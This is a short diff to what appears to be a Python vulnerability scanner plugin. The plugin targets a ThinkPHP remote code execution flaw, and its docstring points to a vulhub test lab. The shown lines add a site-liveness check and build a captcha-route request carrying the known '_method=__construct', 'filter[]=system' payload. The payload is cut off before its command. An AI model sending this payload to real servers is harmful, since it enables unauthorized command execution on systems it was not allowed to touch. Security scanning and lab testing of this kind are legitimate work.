@@ -3,6 +3,8 @@
 import requests 
 from urlparse import urlparse
 import chardet
+from core.common import url_life,gen_domain_url
+
 
 """
 远程代码执行漏洞，vulhub有测试环境
@@ -13,8 +15,11 @@ import chardet
 """
 
 def scan(url):
-    url_parse = urlparse(url)
-    url = url_parse.scheme + "://" + url_parse.netloc + "/index.php?s=captcha"
+    if url_life(gen_domain_url(url)) == True:
+        pass
+    else:
+        return False
+    url = gen_domain_url(url) + "/index.php?s=captcha"
     data = {"_method":"__construct",
             "filter[]":"system",
             "method":"get",
